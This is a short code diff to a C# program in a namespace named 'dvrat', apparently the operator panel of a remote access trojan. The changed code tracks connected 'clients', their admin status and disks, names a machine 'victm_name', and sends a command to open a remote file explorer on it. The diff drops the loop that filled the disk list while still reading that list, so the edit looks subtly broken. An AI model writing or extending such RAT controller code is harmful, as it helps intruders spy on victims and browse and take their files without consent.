@@ -671,13 +671,7 @@ namespace dvrat
                                 client_MAIN_DISK = client_win_main_dir.Split('\\')[0];
                                 string[] disks_arr = xSplit(info_array[5], "&=");
                                 is_admin = string_recv.Contains("true_admin") ? true : false;
-                                for (int i = 1; i < disks_arr.Length; i++)
-                                {
-                                    if (!disks_arr[i].Contains("END"))
-                                    {
-                                        client_ALL_DISK += disks_arr[i].Trim() + '\n';
-                                    }
-                                }
+                               
 
                                 if (!ip.Contains("ERR_WHILE_GET_IP"))
                                 {
@@ -962,7 +956,8 @@ namespace dvrat
                             fle_explr_frm = new file_explorer_form(client_socket, this, client_username_main_dir);
                             fle_explr_frm.victm_name = dataGridView1.Rows[this.selected_client_index].Cells["_PC_NAME"].Value.ToString();
                             send_to_client(client_socket, $"start_fileexplorer;\n{client_username_main_dir}");
-                            new Thread(new ThreadStart(new Action(() => { 
+                            new Thread(new ThreadStart(new Action(() => {
+                                fle_explr_frm._MAIN_DISKS = client_ALL_DISK.Split('\n');
                                 fle_explr_frm.ShowDialog();
                             }))).Start();
                         }
